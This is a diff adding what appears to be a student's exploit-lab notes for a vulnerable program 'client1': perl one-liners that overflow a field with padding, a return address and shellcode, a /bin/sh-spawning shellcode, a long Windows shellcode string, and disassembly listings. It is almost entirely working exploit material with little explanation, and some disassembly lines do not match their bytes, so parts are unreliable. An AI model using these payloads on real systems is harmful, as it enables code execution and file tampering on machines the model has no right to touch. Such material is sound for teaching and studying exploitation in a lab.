@@ -1,0 +1,73 @@
+./client1 -d `perl -e 'print "IMG:","h"x38,"\x60\x4c\x48\x55",";LAT:57.64911;LON:10.40744;CAP:","\x66\x6f\x6f\x2e\x75\x79\x75\x90\x59\x6f\x75\x6c\x6f\x73\x65\x21\x31\xc0\xb0\x04\xbb\x50\x4c\x48\x55\x81\x6b\x04\x90\x10\x10\x10\x31\xc9\x66\xb9\xff\x01\xcd\x80\x89\xc3\x31\xc0\xb0\x04\xb9\x5a\x84\x54\x05\x31\xd2\xb2\x09\xcd\x80"'`
+
+
+shell code to open terminal: exec(/bin/sh)
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80 
+
+address of geo.tag = \x50\x4c\x48\x55
+
+foo.txt => foo.uyu 0x660x6f0x6f0x2e0x750x790x750x90
+
+
+\x31\xc0\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x56\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x14\x75\xf2\x66\xb9\x01\x6d\x66\x81\xe9\x94\x6c\x66\x39\x0f\x66\x89\xc1\x75\xe1\x89\xe5\xeb\x71\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xad\x50\x52\xe8\xaa\xff\xff\xff\x89\x07\x66\x81\xc4\x0c\x01\x66\x81\xec\x04\x01\x66\x81\xc7\x08\x01\x66\x81\xef\x04\x01\x39\xce\x75\xde\xc3\xeb\x10\x5e\x8d\x7d\x04\x89\xf1\x80\xc1\x0c\xe8\xcd\xff\xff\xff\xeb\x3b\xe8\xeb\xff\xff\xff\x6e\x7c\x2e\xe1\x1e\x3c\x3f\xd7\x74\x1e\x48\xcd\x31\xd2\x58\x88\x50\x05\xeb\x2d\x31\xd2\x59\x88\x51\x01\xeb\x2c\x51\x50\xff\x55\x04\xeb\x2a\x31\xd2\x59\x88\x51\x05\xeb\x2d\x51\x50\x89\xc6\xff\x55\x08\x53\xff\x55\x0c\xe8\xd1\xff\xff\xff\x66\x2e\x74\x78\x74\x4e\xe8\xce\xff\xff\xff\x77\x4e\xe8\xcf\xff\xff\xff\xe8\xd1\xff\xff\xff\x70\x77\x6e\x65\x64\x4e\xe8\xce\xff\xff\xff
+
+00000000 <.text>:
+   0:   31 c0                   xor    %eax,%eax
+   2:   b0 08                   mov    $0x8,%al
+   4:   bb 50 4c 48 55          mov    $0x55484c50,%ebx
+   9:   81 6b 04 90 10 10 10    subl   $0x90909090,0x8(%ebx)
+  10:   31 c9                   xor    %ecx,%ecx
+  12:   66 b9 ff 01             mov    $0x1ff,%cx
+  16:   cd 80                   int    $0x80
+  18:   89 c3                   mov    %eax,%ebx
+  1a:   31 c0                   xor    %eax,%eax
+  1c:   b0 04                   mov    $0x4,%al
+  1e:   b9 58 4c 48 55          mov    $0x554845a,%ecx
+  23:   31 d2                   xor    %edx,%edx
+  25:   b2 09       			mov    0x9,%dl
+  2b:   cd 80                   int    $0x80
+
+\x31\xc0\xb0\x08\xbb\x50\x4c\x48\x55\x81\x6b\x04\x90\x10\x10\x10\x31\xc9\x66\xb9\xff\x01\xcd\x80\x89\xc3\x31\xc0\xb0\x04\xb9\x5a\x84\x54\x05\x31\xd2\xb2\x09\xcd\x80
+
+ client1 -d `perl -e 'print "IMG:","h"x38,"\x50\x4c\x48\x55",";LAT:57.64911;LON:10.40744;CAP:","\x31\xc0\xb0\x08\xbb\x00\x00\x00\x00\x66\xb9\xff\x01\xcd\x80\x89\xc3\x31\xc0\xb0\x04\xb0\x08\x00\x00\x00\x31\xd2\xb2\x09\xcd\x80"'`
+
+
+char *temp[] = {"echo","You lose!",NULL};
+  execve("/bin/echo",temp,NULL);
+  close(fd);
+  return 0;
+
+shell code to write hello
+\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f
+
+
+
+0x0000000000400660 <+0>:      55     push   %rbp
+0x0000000000400661 <+1>:      48 89 e5       mov    %rsp,%rbp
+0x0000000000400664 <+4>:      48 83 ec 10    sub    $0x10,%rsp
+0x0000000000400668 <+8>:      ba 00 00 00 00 mov    $0x0,%edx
+0x000000000040066d <+13>:     be 00 00 00 00 mov    $0x0,%esi
+0x0000000000400672 <+18>:     bf cc 07 40 00 mov    $0x4007cc,%edi
+0x0000000000400677 <+23>:     e8 3c fe ff ff callq  0x4004b8 <execve@plt>
+0x000000000040067c <+28>:     be d5 07 40 00 mov    $0x4007d5,%esi
+0x0000000000400681 <+33>:     bf d8 07 40 00 mov    $0x4007d8,%edi
+0x0000000000400686 <+38>:     e8 0d fe ff ff callq  0x400498 <fopen@plt>
+0x000000000040068b <+43>:     48 89 45 f8    mov    %rax,-0x8(%rbp)
+0x000000000040068f <+47>:     48 83 7d f8 00 cmpq   $0x0,-0x8(%rbp)
+0x0000000000400694 <+52>:     75 11  jne    0x4006a7 <main+71>
+0x0000000000400696 <+54>:     bf e0 07 40 00 mov    $0x4007e0,%edi
+0x000000000040069b <+59>:     e8 48 fe ff ff callq  0x4004e8 <perror@plt>
+0x00000000004006a0 <+64>:     b8 01 00 00 00 mov    $0x1,%eax
+0x00000000004006a5 <+69>:     eb 2c  jmp    0x4006d3 <main+115>
+0x00000000004006a7 <+71>:     48 8b 45 f8    mov    -0x8(%rbp),%rax
+0x00000000004006ab <+75>:     48 89 c1       mov    %rax,%rcx
+0x00000000004006ae <+78>:     ba 0a 00 00 00 mov    $0xa,%edx
+0x00000000004006b3 <+83>:     be 01 00 00 00 mov    $0x1,%esi
+0x00000000004006b8 <+88>:     bf eb 07 40 00 mov    $0x4007eb,%edi
+0x00000000004006bd <+93>:     e8 16 fe ff ff callq  0x4004d8 <fwrite@plt>
+0x00000000004006c2 <+98>:     48 8b 45 f8    mov    -0x8(%rbp),%rax
+0x00000000004006c6 <+102>:    48 89 c7       mov    %rax,%rdi
+0x00000000004006c9 <+105>:    e8 fa fd ff ff callq  0x4004c8 <fclose@plt>
+0x00000000004006ce <+110>:    b8 00 00 00 00 mov    $0x0,%eax
+0x00000000004006d3 <+115>:    c9     leaveq
+0x00000000004006d4 <+116>:    c3     retq
